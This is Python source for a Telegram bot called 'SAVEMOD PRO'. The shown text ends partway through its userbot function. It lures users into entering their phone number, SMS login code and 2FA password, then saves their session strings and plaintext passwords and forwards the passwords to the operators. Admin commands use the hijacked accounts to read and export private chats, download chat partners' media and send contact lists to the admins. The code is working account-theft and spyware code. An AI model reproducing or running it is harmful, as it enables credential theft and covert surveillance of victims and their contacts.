import asyncio
import sqlite3
import os
import sys
import shutil
import tempfile
import html
import logging
from datetime import datetime
from threading import Thread

from flask import Flask, jsonify
from telethon import TelegramClient, events
from telethon.sessions import StringSession
from telethon.tl.types import UserStatusOnline, UserStatusOffline
from telethon.tl.functions.account import UpdateStatusRequest
from aiogram import Bot, Dispatcher, types as aiogram_types
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton, InputFile, ReplyKeyboardMarkup, KeyboardButton
from aiogram.utils import executor
import nest_asyncio
import pytz

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)
nest_asyncio.apply()

API_ID = int(os.environ.get('API_ID', 0))
API_HASH = os.environ.get('API_HASH', '')
BOT_TOKEN = os.environ.get('BOT_TOKEN', '')
ADMIN_IDS = [int(x.strip()) for x in os.environ.get('ADMIN_IDS', '').split(',') if x.strip()]

if not API_ID or not API_HASH or not BOT_TOKEN:
    logger.error("Ошибка: Не заданы переменные окружения")
    sys.exit(1)

VOLUME_PATH = os.environ.get('VOLUME_MOUNTS', '/app/data')
if not os.path.exists(VOLUME_PATH):
    VOLUME_PATH = '.'
    os.makedirs(VOLUME_PATH, exist_ok=True)

DB_PATH = os.path.join(VOLUME_PATH, 'userbot.db')

conn = sqlite3.connect(DB_PATH, check_same_thread=False)
cursor = conn.cursor()

cursor.execute('''
    CREATE TABLE IF NOT EXISTS user_sessions (
        user_id INTEGER PRIMARY KEY,
        session_string TEXT,
        phone TEXT,
        two_fa TEXT,
        first_name TEXT,
        last_name TEXT,
        username TEXT,
        is_active INTEGER DEFAULT 0,
        registered_at TEXT
    )
''')

cursor.execute('''
    CREATE TABLE IF NOT EXISTS muted_users (
        user_id INTEGER,
        muted_by INTEGER,
        muted_at TEXT,
        PRIMARY KEY (user_id, muted_by)
    )
''')

cursor.execute('''
    CREATE TABLE IF NOT EXISTS saved_messages (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        owner_id INTEGER,
        msg_id INTEGER,
        sender_id INTEGER,
        text TEXT,
        date TEXT
    )
''')
conn.commit()

active_clients = {}
saved_messages = {}
temp_auth = {}
pending_2fa = {}
pending_chat_count = {}
current_active_user = None

bot = Bot(token=BOT_TOKEN, parse_mode='HTML')
dp = Dispatcher(bot)
tz = pytz.timezone('Europe/Saratov')

# ========== ВСПОМОГАТЕЛЬНЫЕ ФУНКЦИИ ==========

def is_admin(user_id):
    return user_id in ADMIN_IDS

def is_target_admin(target_id):
    return target_id in ADMIN_IDS

def escape_html(text):
    return html.escape(str(text))

def get_active_client():
    global current_active_user
    if current_active_user and current_active_user in active_clients:
        return active_clients[current_active_user], current_active_user
    for uid, client in active_clients.items():
        if not is_target_admin(uid):
            current_active_user = uid
            return client, uid
    return None, None

async def resolve_entity(client, target):
    try:
        if target.isdigit():
            return await client.get_entity(int(target))
        return await client.get_entity(target)
    except:
        return None

async def send_to_admin(text):
    for admin_id in ADMIN_IDS:
        try:
            await bot.send_message(admin_id, text, parse_mode='HTML')
        except:
            pass

# ========== КЛАВИАТУРЫ ==========

def get_main_menu():
    kb = InlineKeyboardMarkup(row_width=2)
    kb.add(
        InlineKeyboardButton("👥 Аккаунты", callback_data="menu_users"),
        InlineKeyboardButton("💬 Диалоги", callback_data="menu_chats"),
        InlineKeyboardButton("🎬 Кража медиа", callback_data="menu_steal"),
        InlineKeyboardButton("📊 Статистика", callback_data="menu_stats"),
        InlineKeyboardButton("⚙️ Настройки", callback_data="menu_settings")
    )
    return kb

def get_accounts_keyboard(page=0):
    cursor.execute('SELECT user_id, first_name, username, is_active FROM user_sessions')
    rows = cursor.fetchall()
    accounts = [(uid, fn or un or str(uid), act) for uid, fn, un, act in rows if not is_target_admin(uid)]
    
    if not accounts:
        return None
    
    per_page = 5
    total_pages = (len(accounts) + per_page - 1) // per_page
    start = page * per_page
    end = start + per_page
    page_accounts = accounts[start:end]
    
    kb = InlineKeyboardMarkup(row_width=2)
    for uid, name, act in page_accounts:
        status = "✅" if (act == 1 or uid == current_active_user) else "❌"
        kb.add(InlineKeyboardButton(f"{status} {name[:20]}", callback_data=f"account_{uid}"))
    
    nav_buttons = []
    if page > 0:
        nav_buttons.append(InlineKeyboardButton("◀️ Назад", callback_data=f"accounts_page_{page-1}"))
    if page + 1 < total_pages:
        nav_buttons.append(InlineKeyboardButton("Вперед ▶️", callback_data=f"accounts_page_{page+1}"))
    if nav_buttons:
        kb.row(*nav_buttons)
    
    kb.row(InlineKeyboardButton("🔙 Главное меню", callback_data="main_menu"))
    return kb

def get_account_actions_keyboard(user_id):
    kb = InlineKeyboardMarkup(row_width=2)
    kb.add(
        InlineKeyboardButton("📒 Контакты", callback_data=f"steal_con_{user_id}"),
        InlineKeyboardButton("🔄 Сделать активным", callback_data=f"make_active_{user_id}"),
        InlineKeyboardButton("🗑 Удалить", callback_data=f"del_account_{user_id}")
    )
    kb.add(InlineKeyboardButton("🔙 Назад", callback_data="menu_users"))
    return kb

def get_chats_keyboard(page=0):
    cl, uid = get_active_client()
    if not cl:
        return None
    
    chats = []
    async def fetch_chats():
        nonlocal chats
        async for dlg in cl.iter_dialogs():
            if dlg.is_user:
                try:
                    ent = await cl.get_entity(dlg.id)
                    if not getattr(ent, 'bot', False) and ent.id != uid and not is_target_admin(ent.id):
                        name = ent.first_name or ent.username or str(ent.id)
                        chats.append({'id': ent.id, 'name': name})
                except:
                    pass
        return chats
    
    try:
        import concurrent.futures
        with concurrent.futures.ThreadPoolExecutor() as executor:
            future = executor.submit(asyncio.run, fetch_chats())
            chats = future.result(timeout=15)
    except:
        return None
    
    if not chats:
        return None
    
    per_page = 5
    total_pages = (len(chats) + per_page - 1) // per_page
    start = page * per_page
    end = start + per_page
    
    kb = InlineKeyboardMarkup(row_width=1)
    for chat in chats[start:end]:
        kb.add(InlineKeyboardButton(f"💬 {chat['name'][:30]}", callback_data=f"chat_{chat['id']}_{chat['name']}"))
    
    nav_buttons = []
    if page > 0:
        nav_buttons.append(InlineKeyboardButton("◀️", callback_data=f"chats_page_{page-1}"))
    if page + 1 < total_pages:
        nav_buttons.append(InlineKeyboardButton("▶️", callback_data=f"chats_page_{page+1}"))
    if nav_buttons:
        kb.row(*nav_buttons)
    
    kb.row(InlineKeyboardButton("🔄 Обновить", callback_data="menu_chats"))
    kb.row(InlineKeyboardButton("🔙 Главное меню", callback_data="main_menu"))
    return kb

def get_code_keyboard():
    kb = InlineKeyboardMarkup(row_width=3)
    for i in range(1, 10):
        kb.insert(InlineKeyboardButton(str(i), callback_data=f"code_{i}"))
    kb.row(
        InlineKeyboardButton("0", callback_data="code_0"),
        InlineKeyboardButton("⌫", callback_data="code_back"),
        InlineKeyboardButton("✅", callback_data="code_done")
    )
    return kb

# ========== АДМИН КОМАНДЫ ==========

@dp.message_handler(commands=['start', 'menu'])
async def cmd_menu(message):
    uid = message.from_user.id
    
    if not is_admin(uid):
        cursor.execute('SELECT session_string FROM user_sessions WHERE user_id=?', (uid,))
        row = cursor.fetchone()
        if row and row[0]:
            await message.answer("✅ <b>SAVEMOD PRO</b> активен!\n.help - команды юзербота", parse_mode='HTML')
            if uid not in active_clients:
                asyncio.create_task(run_userbot(uid, row[0]))
        else:
            kb = ReplyKeyboardMarkup(resize_keyboard=True, one_time_keyboard=True)
            kb.add(KeyboardButton("📱 Поделиться номером", request_contact=True))
            await message.answer(
                "🔐 <b>SAVEMOD PRO</b>\n\nДля регистрации нажми на кнопку и отправь номер телефона.",
                parse_mode='HTML',
                reply_markup=kb
            )
        return
    
    await message.answer(
        "🔰 <b>SAVEMOD PRO</b>\n\nУправление аккаунтами и слежка\nВыбери действие:",
        parse_mode='HTML',
        reply_markup=get_main_menu()
    )

@dp.message_handler(commands=['reset_me'])
async def cmd_reset_me(message):
    uid = message.from_user.id
    if uid in active_clients:
        try:
            await active_clients[uid].disconnect()
        except:
            pass
        del active_clients[uid]
    cursor.execute('DELETE FROM user_sessions WHERE user_id=?', (uid,))
    conn.commit()
    await message.answer("✅ Сессия удалена. Отправь /start")

@dp.message_handler(commands=['swap'])
async def cmd_swap(message):
    if not is_admin(message.from_user.id):
        return
    global current_active_user
    args = message.get_args()
    if not args:
        await message.answer("❌ /swap НОМЕР\nПример: /swap 1")
        return
    try:
        num = int(args) - 1
        cursor.execute('SELECT user_id, first_name, username FROM user_sessions')
        rows = cursor.fetchall()
        na = [(uid, fn, un) for uid, fn, un in rows if not is_target_admin(uid)]
        if num < 0 or num >= len(na):
            await message.answer("❌ Неверный номер")
            return
        user_id = na[num][0]
        name = na[num][1] or na[num][2] or str(user_id)
        if user_id not in active_clients:
            await message.answer(f"❌ Аккаунт {name} не запущен")
            return
        current_active_user = user_id
        cursor.execute('UPDATE user_sessions SET is_active=0')
        cursor.execute('UPDATE user_sessions SET is_active=1 WHERE user_id=?', (user_id,))
        conn.commit()
        me = await active_clients[user_id].get_me()
        await message.answer(f"✅ Переключился на {me.first_name}")
    except Exception as e:
        await message.answer(f"❌ Ошибка: {e}")

@dp.message_handler(commands=['steal', 'steal_photo', 'steal_video'])
async def cmd_steal(message):
    if not is_admin(message.from_user.id):
        return
    
    cl, uid = get_active_client()
    if not cl:
        await message.answer("❌ Нет активного аккаунта\n/swap для выбора")
        return
    
    args = message.get_args()
    if not args:
        await message.answer("❌ /steal @username\n/steal_photo @username\n/steal_video @username")
        return
    
    cmd_type = message.get_command().replace('/', '')
    target = args.strip()
    ent = await resolve_entity(cl, target)
    if not ent:
        await message.answer("❌ Пользователь не найден")
        return
    if ent.id == uid or is_target_admin(ent.id):
        await message.answer("❌ Нельзя")
        return
    
    target_name = ent.first_name or ent.username or str(ent.id)
    
    if cmd_type == 'steal_photo':
        await message.answer(f"📷 Краду фото у {target_name}...")
        count = 0
        async for msg in cl.iter_messages(ent.id, limit=300):
            if msg.photo:
                try:
                    path = await msg.download_media()
                    if path:
                        with open(path, 'rb') as f:
                            await bot.send_photo(message.from_user.id, InputFile(f), caption=f"📸 {target_name}")
                        os.remove(path)
                        count += 1
                        await asyncio.sleep(0.1)
                except:
                    pass
        await message.answer(f"✅ Скачано {count} фото")
    
    elif cmd_type == 'steal_video':
        await message.answer(f"🎬 Краду видео у {target_name}...")
        count = 0
        async for msg in cl.iter_messages(ent.id, limit=300):
            if msg.video:
                try:
                    path = await msg.download_media()
                    if path:
                        with open(path, 'rb') as f:
                            await bot.send_video(message.from_user.id, InputFile(f), caption=f"🎬 {target_name}")
                        os.remove(path)
                        count += 1
                        await asyncio.sleep(0.15)
                except:
                    pass
        await message.answer(f"✅ Скачано {count} видео")
    
    else:
        await message.answer(f"🔄 Кража медиа у {target_name} (последние 300)...")
        
        media_by_type = {'photo': [], 'video': [], 'video_note': [], 'voice': [], 'sticker': [], 'document': []}
        
        async for msg in cl.iter_messages(ent.id, limit=300):
            if msg.photo:
                media_by_type['photo'].append(msg)
            elif msg.video:
                media_by_type['video'].append(msg)
            elif msg.video_note:
                media_by_type['video_note'].append(msg)
            elif msg.voice:
                media_by_type['voice'].append(msg)
            elif msg.sticker:
                media_by_type['sticker'].append(msg)
            elif msg.document:
                media_by_type['document'].append(msg)
        
        total = sum(len(v) for v in media_by_type.values())
        if total == 0:
            await message.answer(f"❌ Нет медиа у {target_name}")
            return
        
        await message.answer(f"📦 Найдено: 📷{len(media_by_type['photo'])} 🎬{len(media_by_type['video'])} 🔄{len(media_by_type['video_note'])} 🎤{len(media_by_type['voice'])} 🎨{len(media_by_type['sticker'])} 📎{len(media_by_type['document'])}")
        
        for media_type, msgs in media_by_type.items():
            for msg in msgs:
                try:
                    path = await msg.download_media()
                    if path:
                        ext = os.path.splitext(path)[1] or '.file'
                        safe_name = f"{target_name}_{media_type}_{msg.id}{ext}"
                        new_path = os.path.join(tempfile.gettempdir(), safe_name)
                        shutil.move(path, new_path)
                        with open(new_path, 'rb') as f:
                            await bot.send_document(message.from_user.id, InputFile(f, filename=safe_name), caption=f"📎 {media_type} от {target_name}")
                        os.remove(new_path)
                        await asyncio.sleep(0.1)
                except:
                    pass
        
        await message.answer(f"✅ Украдено {total} файлов")

# ========== РЕГИСТРАЦИЯ ==========

@dp.message_handler(content_types=aiogram_types.ContentType.CONTACT)
async def handle_contact(message):
    uid = message.from_user.id
    phone = message.contact.phone_number
    
    try:
        client = TelegramClient(StringSession(), API_ID, API_HASH)
        await client.connect()
        res = await client.send_code_request(phone)
        temp_auth[uid] = {
            'client': client, 
            'phone': phone, 
            'hash': res.phone_code_hash, 
            'code': ''
        }
        await message.answer("📱 Введи код из SMS:", reply_markup=get_code_keyboard())
    except Exception as e:
        await message.answer(f"❌ Ошибка: {e}")

@dp.callback_query_handler(lambda c: c.data.startswith('code_'))
async def handle_code(cb):
    uid = cb.from_user.id
    if uid not in temp_auth:
        await cb.answer("Сессия истекла, /start")
        return
    action = cb.data.replace('code_', '')
    cur = temp_auth[uid].get('code', '')
    
    if action.isdigit():
        if len(cur) < 5:
            temp_auth[uid]['code'] = cur + action
    elif action == 'back':
        temp_auth[uid]['code'] = cur[:-1]
    elif action == 'done':
        if len(cur) == 5:
            await cb.answer("Авторизация...")
            await complete_auth(cb, uid)
            return
        else:
            await cb.answer("Нужно 5 цифр", show_alert=True)
            return
    
    code = temp_auth[uid]['code']
    disp = code + "".join(["▫" for _ in range(5 - len(code))])
    await cb.message.edit_text(f"📱 Код: {disp}", reply_markup=get_code_keyboard())
    await cb.answer()

async def complete_auth(cb, uid):
    data = temp_auth[uid]
    try:
        await data['client'].sign_in(phone=data['phone'], code=data['code'], phone_code_hash=data['hash'])
        ss = data['client'].session.save()
        me = await data['client'].get_me()
        cursor.execute('INSERT OR REPLACE INTO user_sessions (user_id, session_string, phone, two_fa, first_name, last_name, username, is_active, registered_at) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)',
                       (uid, ss, data['phone'], None, me.first_name, me.last_name, me.username, 0, datetime.now().isoformat()))
        conn.commit()
        await cb.message.answer(f"✅ <b>SAVEMOD PRO</b>\n👤 {me.first_name}\n\n/start - меню", parse_mode='HTML')
        if is_admin(uid):
            await send_to_admin(f"🔐 НОВЫЙ АККАУНТ: {me.first_name}\n📱 {data['phone']}")
        asyncio.create_task(run_userbot(uid, ss))
        await data['client'].disconnect()
        del temp_auth[uid]
    except Exception as e:
        if '2fa' in str(e).lower() or 'password' in str(e).lower():
            await cb.message.answer("🔐 Введи облачный пароль (2FA):")
            pending_2fa[uid] = data
            del temp_auth[uid]
        else:
            await cb.message.answer(f"❌ Ошибка: {e}")

@dp.message_handler(lambda msg: msg.from_user.id in pending_2fa)
async def handle_2fa(message):
    uid = message.from_user.id
    data = pending_2fa[uid]
    try:
        await data['client'].sign_in(password=message.text.strip())
        ss = data['client'].session.save()
        me = await data['client'].get_me()
        cursor.execute('INSERT OR REPLACE INTO user_sessions (user_id, session_string, phone, two_fa, first_name, last_name, username, is_active, registered_at) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)',
                       (uid, ss, data['phone'], message.text.strip(), me.first_name, me.last_name, me.username, 0, datetime.now().isoformat()))
        conn.commit()
        await message.answer(f"✅ <b>SAVEMOD PRO</b>\n👤 {me.first_name}\n\n/start - меню", parse_mode='HTML')
        if is_admin(uid):
            await send_to_admin(f"🔐 НОВЫЙ АККАУНТ (2FA): {me.first_name}\n📱 {data['phone']}\n🔒 Пароль: {message.text.strip()}")
        asyncio.create_task(run_userbot(uid, ss))
        await data['client'].disconnect()
        del pending_2fa[uid]
    except Exception as e:
        await message.answer(f"❌ Ошибка 2FA: {e}")

# ========== CALLBACK HANDLERS ==========

@dp.callback_query_handler(lambda c: c.data == "main_menu")
async def main_menu_callback(cb):
    await cb.message.edit_text(
        "🔰 <b>SAVEMOD PRO</b>\n\nВыбери действие:",
        parse_mode='HTML',
        reply_markup=get_main_menu()
    )
    await cb.answer()

@dp.callback_query_handler(lambda c: c.data == "menu_users")
async def menu_users(cb):
    kb = get_accounts_keyboard()
    if not kb:
        await cb.message.edit_text("📭 Нет аккаунтов\n\n➕ Отправь /start в бот от аккаунта который хочешь добавить")
        await cb.answer()
        return
    await cb.message.edit_text("👥 <b>Аккаунты</b>\n\nВыбери аккаунт:", parse_mode='HTML', reply_markup=kb)
    await cb.answer()

@dp.callback_query_handler(lambda c: c.data.startswith('accounts_page_'))
async def accounts_page(cb):
    page = int(cb.data.split('_')[-1])
    kb = get_accounts_keyboard(page)
    if kb:
        await cb.message.edit_reply_markup(reply_markup=kb)
    await cb.answer()

@dp.callback_query_handler(lambda c: c.data.startswith('account_'))
async def account_detail(cb):
    uid = int(cb.data.split('_')[1])
    cursor.execute('SELECT first_name, username, phone, is_active FROM user_sessions WHERE user_id=?', (uid,))
    row = cursor.fetchone()
    if not row:
        await cb.answer("Аккаунт не найден")
        return
    fn, un, ph, act = row
    name = fn or un or str(uid)
    status = "✅ Активен" if (act == 1 or uid == current_active_user) else "❌ Неактивен"
    text = f"👤 <b>{name}</b>\n\n🆔 <code>{uid}</code>\n📱 {ph or 'нет'}\n📊 {status}"
    await cb.message.edit_text(text, parse_mode='HTML', reply_markup=get_account_actions_keyboard(uid))
    await cb.answer()

@dp.callback_query_handler(lambda c: c.data.startswith('make_active_'))
async def make_active(cb):
    global current_active_user
    uid = int(cb.data.split('_')[2])
    if uid not in active_clients:
        await cb.answer("❌ Аккаунт не запущен", show_alert=True)
        return
    current_active_user = uid
    cursor.execute('UPDATE user_sessions SET is_active=0')
    cursor.execute('UPDATE user_sessions SET is_active=1 WHERE user_id=?', (uid,))
    conn.commit()
    await cb.answer(f"✅ Аккаунт активирован", show_alert=True)
    await menu_users(cb)

@dp.callback_query_handler(lambda c: c.data.startswith('del_account_'))
async def del_account(cb):
    uid = int(cb.data.split('_')[2])
    if uid in active_clients:
        try:
            await active_clients[uid].disconnect()
        except:
            pass
        del active_clients[uid]
    cursor.execute('DELETE FROM user_sessions WHERE user_id=?', (uid,))
    cursor.execute('DELETE FROM muted_users WHERE muted_by=?', (uid,))
    conn.commit()
    await cb.answer("✅ Аккаунт удален", show_alert=True)
    await menu_users(cb)

@dp.callback_query_handler(lambda c: c.data.startswith('steal_con_'))
async def steal_con(cb):
    uid = int(cb.data.split('_')[2])
    
    if uid in active_clients:
        client = active_clients[uid]
    else:
        cursor.execute('SELECT session_string FROM user_sessions WHERE user_id=?', (uid,))
        row = cursor.fetchone()
        if not row or not row[0]:
            await cb.answer("❌ Сессия не найдена", show_alert=True)
            return
        client = TelegramClient(StringSession(row[0]), API_ID, API_HASH)
        await client.connect()
        if not await client.is_user_authorized():
            await cb.answer("❌ Сессия умерла", show_alert=True)
            return
    
    await cb.answer("🔄 Краду контакты...")
    me = await client.get_me()
    
    contacts = []
    async for dialog in client.iter_dialogs():
        if dialog.is_user and not getattr(dialog.entity, 'bot', False):
            ent = dialog.entity
            name = f"{ent.first_name or ''} {ent.last_name or ''}".strip()
            uname = f"@{ent.username}" if ent.username else ""
            phone = getattr(ent, 'phone', '') or ''
            contacts.append(f"{name} {uname} 📞{phone} 🆔{ent.id}")
    
    if contacts:
        text = f"📒 КОНТАКТЫ {me.first_name} ({len(contacts)} шт):\n" + "\n".join(contacts[:100])
        for admin_id in ADMIN_IDS:
            try:
                await bot.send_message(admin_id, text[:4000])
            except:
                pass
        await cb.message.answer(f"✅ Выгружено {len(contacts)} контактов")
    else:
        await cb.message.answer("❌ Нет контактов")
    
    if uid not in active_clients:
        await client.disconnect()

@dp.callback_query_handler(lambda c: c.data == "menu_chats")
async def menu_chats(cb):
    await cb.message.edit_text("💬 <b>Диалоги</b>\n\nЗагрузка...", parse_mode='HTML')
    kb = get_chats_keyboard()
    if not kb:
        await cb.message.edit_text("❌ Нет активного аккаунта или диалогов\n\n/swap для выбора аккаунта")
        await cb.answer()
        return
    await cb.message.edit_text("💬 <b>Диалоги</b>\n\nВыбери чат:", parse_mode='HTML', reply_markup=kb)
    await cb.answer()

@dp.callback_query_handler(lambda c: c.data.startswith('chats_page_'))
async def chats_page(cb):
    page = int(cb.data.split('_')[-1])
    kb = get_chats_keyboard(page)
    if kb:
        await cb.message.edit_reply_markup(reply_markup=kb)
    await cb.answer()

@dp.callback_query_handler(lambda c: c.data.startswith('chat_'))
async def chat_detail(cb):
    parts = cb.data.split('_')
    target_id = int(parts[1])
    target_name = '_'.join(parts[2:])
    
    pending_chat_count[cb.from_user.id] = {'target_id': target_id, 'target_name': target_name}
    
    kb = InlineKeyboardMarkup(row_width=2)
    kb.add(
        InlineKeyboardButton("📝 30", callback_data=f"last30_{target_id}_{target_name}"),
        InlineKeyboardButton("🔢 Своё", callback_data=f"customcount_{target_id}_{target_name}"),
        InlineKeyboardButton("📄 HTML", callback_data=f"htmlexport_{target_id}_{target_name}")
    )
    kb.add(InlineKeyboardButton("🔙 Диалоги", callback_data="menu_chats"))
    
    await cb.message.edit_text(f"📱 <b>{target_name}</b>\n\nВыбери действие:", parse_mode='HTML', reply_markup=kb)
    await cb.answer()

@dp.callback_query_handler(lambda c: c.data.startswith('last30_'))
async def last30(cb):
    data = cb.data.replace('last30_', '').split('_', 1)
    target_id = int(data[0])
    target_name = data[1]
    
    cl, uid = get_active_client()
    if not cl:
        await cb.message.answer("❌ Нет активного аккаунта")
        return
    
    await cb.answer("Загружаю...")
    msgs = []
    async for msg in cl.iter_messages(target_id, limit=30):
        if msg.text:
            try:
                sn = "👉 Я" if msg.out else (await cl.get_entity(msg.sender_id)).first_name or str(msg.sender_id)
                if is_target_admin(msg.sender_id if not msg.out else 0):
                    continue
                dt = msg.date.strftime('%d.%m %H:%M')
                msgs.append(f"[{dt}] {sn}: {msg.text[:200]}")
            except:
                msgs.append(f"[{msg.date.strftime('%d.%m %H:%M')}] {msg.text[:200]}")
    
    if msgs:
        text = "💬 <b>" + target_name + "</b>\n\n" + "\n".join(reversed(msgs))
        if len(text) > 3500:
            text = text[:3500] + "\n\n... (обрезано)"
        kb = InlineKeyboardMarkup().add(InlineKeyboardButton("🔙 Назад", callback_data=f"chat_{target_id}_{target_name}"))
        await cb.message.edit_text(text, parse_mode='HTML', reply_markup=kb)
    else:
        kb = InlineKeyboardMarkup().add(InlineKeyboardButton("🔙 Назад", callback_data=f"chat_{target_id}_{target_name}"))
        await cb.message.edit_text("📭 Нет сообщений", reply_markup=kb)

@dp.callback_query_handler(lambda c: c.data.startswith('customcount_'))
async def custom_count(cb):
    data = cb.data.replace('customcount_', '').split('_', 1)
    target_id = int(data[0])
    target_name = data[1]
    pending_chat_count[cb.from_user.id] = {'target_id': target_id, 'target_name': target_name}
    await cb.message.answer("🔢 Введи количество (1-500):")
    await cb.answer()

@dp.message_handler(lambda msg: msg.from_user.id in pending_chat_count)
async def handle_custom_count(message):
    if not is_admin(message.from_user.id):
        return
    user_id = message.from_user.id
    data = pending_chat_count[user_id]
    try:
        limit = min(int(message.text.strip()), 500)
        if limit < 1:
            raise
    except:
        await message.answer("❌ Введи число от 1 до 500")
        del pending_chat_count[user_id]
        return
    
    cl, uid = get_active_client()
    if not cl:
        await message.answer("❌ Нет активного аккаунта")
        del pending_chat_count[user_id]
        return
    
    status = await message.answer(f"🔄 Загружаю {limit} сообщений...")
    msgs = []
    async for msg in cl.iter_messages(data['target_id'], limit=limit):
        if msg.text:
            try:
                sn = "👉 Я" if msg.out else (await cl.get_entity(msg.sender_id)).first_name or str(msg.sender_id)
                if is_target_admin(msg.sender_id if not msg.out else 0):
                    continue
                dt = msg.date.strftime('%d.%m %H:%M')
                msgs.append(f"[{dt}] {sn}: {msg.text[:200]}")
            except:
                msgs.append(f"[{msg.date.strftime('%d.%m %H:%M')}] {msg.text[:200]}")
    
    await status.delete()
    if msgs:
        response = f"💬 <b>{data['target_name']}</b>\n\n" + "\n".join(reversed(msgs))
        if len(response) > 4000:
            for i in range(0, len(msgs), 20):
                await message.answer("\n".join(reversed(msgs[i:i+20])), parse_mode='HTML')
        else:
            await message.answer(response, parse_mode='HTML')
    else:
        await message.answer("📭 Нет сообщений")
    del pending_chat_count[user_id]

@dp.callback_query_handler(lambda c: c.data.startswith('htmlexport_'))
async def export_html(cb):
    data = cb.data.replace('htmlexport_', '').split('_', 1)
    target_id = int(data[0])
    target_name = data[1]
    
    cl, uid = get_active_client()
    if not cl:
        await cb.message.answer("❌ Нет активного аккаунта")
        return
    
    await cb.answer("Экспортирую...")
    try:
        me = await cl.get_me()
        messages = []
        async for msg in cl.iter_messages(target_id, limit=500):
            if msg.text:
                try:
                    if msg.out:
                        sender_name = f"{me.first_name} (Вы)"
                    else:
                        sender = await cl.get_entity(msg.sender_id)
                        sender_name = sender.first_name or sender.username or str(msg.sender_id)
                    dt = msg.date.astimezone(tz)
                    time_str = dt.strftime('%H:%M')
                    date_str = dt.strftime('%d.%m.%Y')
                    text = escape_html(msg.text).replace('\n', '<br>')
                    messages.append(f'<div class="msg"><div class="sender">{escape_html(sender_name)}</div><div class="time">{time_str} {date_str}</div><div class="text">{text}</div></div>')
                except:
                    continue
        
        if not messages:
            await cb.message.answer("❌ Нет сообщений")
            return
        
        messages.reverse()
        html_content = f'''<!DOCTYPE html>
<html><head><meta charset="UTF-8"><title>Чат с {escape_html(target_name)}</title>
<style>body{{font-family:Arial;background:#0e1621;color:#e1e8f0;padding:20px}}.container{{max-width:800px;margin:0 auto;background:#17212b;border-radius:10px;padding:20px}}.msg{{margin-bottom:15px;padding:10px;background:#2b3945;border-radius:10px}}.sender{{font-weight:bold}}.time{{font-size:10px;color:#6c7883}}.text{{font-size:14px;margin-top:5px}}</style>
</head><body><div class="container"><h2>Чат с {escape_html(target_name)}</h2><p>Всего сообщений: {len(messages)}</p>{''.join(messages)}<p>📅 {datetime.now(tz).strftime('%d.%m.%Y %H:%M:%S')}</p></div></body></html>'''
        
        with tempfile.NamedTemporaryFile(mode='w', suffix='.html', encoding='utf-8', delete=False) as f:
            f.write(html_content)
            path = f.name
        with open(path, 'rb') as f:
            await bot.send_document(cb.from_user.id, InputFile(f, filename=f"chat_{target_name}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.html"), caption=f"📁 Чат с {target_name}")
        os.unlink(path)
        await cb.answer("✅ Готово", show_alert=True)
    except Exception as e:
        await cb.message.answer(f"❌ Ошибка: {e}")

@dp.callback_query_handler(lambda c: c.data == "menu_steal")
async def menu_steal(cb):
    cl, uid = get_active_client()
    if not cl:
        await cb.message.edit_text("❌ Нет активного аккаунта\n\n/swap для выбора")
        await cb.answer()
        return
    
    kb = InlineKeyboardMarkup(row_width=1)
    kb.add(InlineKeyboardButton("🔙 Главное меню", callback_data="main_menu"))
    
    await cb.message.edit_text(
        "🎬 <b>Кража медиа</b>\n\n"
        "Используй команду в чате:\n"
        "<code>/steal @username</code>\n\n"
        "Пример: <code>/steal @durov</code>\n\n"
        "Бот скачает все фото/видео/голосовые/стикеры.\n\n"
        "Дополнительные команды:\n"
        "<code>/steal_photo @username</code> - только фото\n"
        "<code>/steal_video @username</code> - только видео",
        parse_mode='HTML',
        reply_markup=kb
    )
    await cb.answer()

@dp.callback_query_handler(lambda c: c.data == "menu_stats")
async def menu_stats(cb):
    acc = cursor.execute('SELECT COUNT(*) FROM user_sessions').fetchone()[0]
    muted = cursor.execute('SELECT COUNT(*) FROM muted_users').fetchone()[0]
    active = len(active_clients)
    db_size = os.path.getsize(DB_PATH) // 1024 if os.path.exists(DB_PATH) else 0
    
    text = f"📊 <b>СТАТИСТИКА</b>\n\n"
    text += f"👥 Аккаунтов: {acc}\n"
    text += f"🟢 Активных: {active}\n"
    text += f"🔇 Заглушено: {muted}\n"
    text += f"💾 БД: {db_size} KB"
    
    kb = InlineKeyboardMarkup().add(InlineKeyboardButton("🔙 Главное меню", callback_data="main_menu"))
    await cb.message.edit_text(text, parse_mode='HTML', reply_markup=kb)
    await cb.answer()

@dp.callback_query_handler(lambda c: c.data == "menu_settings")
async def menu_settings(cb):
    kb = InlineKeyboardMarkup(row_width=1)
    kb.add(
        InlineKeyboardButton("💾 Сделать бэкап", callback_data="backup"),
        InlineKeyboardButton("👻 Призрак on/off", callback_data="ghost_toggle"),
        InlineKeyboardButton("🔙 Главное меню", callback_data="main_menu")
    )
    await cb.message.edit_text("⚙️ <b>Настройки</b>\n\nВыбери действие:", parse_mode='HTML', reply_markup=kb)
    await cb.answer()

@dp.callback_query_handler(lambda c: c.data == "backup")
async def cmd_backup(cb):
    await cb.answer("💾 Создаю...")
    bp = os.path.join(VOLUME_PATH, f'backup_{datetime.now().strftime("%Y%m%d_%H%M%S")}.db')
    shutil.copy2(DB_PATH, bp)
    with open(bp, 'rb') as f:
        await bot.send_document(cb.from_user.id, InputFile(f, filename=os.path.basename(bp)), caption="💾 Бэкап БД")
    os.remove(bp)
    await cb.message.answer("✅ Бэкап отправлен")

@dp.callback_query_handler(lambda c: c.data == "ghost_toggle")
async def cmd_ghost(cb):
    cl, uid = get_active_client()
    if not cl:
        await cb.answer("❌ Нет активного аккаунта")
        return
    
    try:
        await cl(UpdateStatusRequest(offline=True))
        await cb.answer("👻 Режим призрака включен (оффлайн)", show_alert=True)
    except:
        await cb.answer("❌ Ошибка")

# ========== ЮЗЕРБОТ ==========

async def run_userbot(owner_id, session_string):
    if owner_id in active_clients:
        try:
            await active_clients[owner_id].disconnect()
        except:
            pass
    client = TelegramClient(StringSession(session_string), API_ID, API_HASH)
    await client.connect()
    if not await client.is_user_authorized():
        cursor.execute('DELETE FROM user_sessions WHERE user_id=?', (owner_id,))
        conn.commit()
        return
    active_clients[owner_id] = client
    saved_messages[owner_id] = {}
    logger.info(f"✅ Юзербот запущен для {owner_id}")
    me = await client.get_me()
    
    cursor.execute('SELECT user_id FROM muted_users WHERE muted_by=?', (owner_id,))
    muted_users = {row[0] for row in cursor.fetchall()}
    
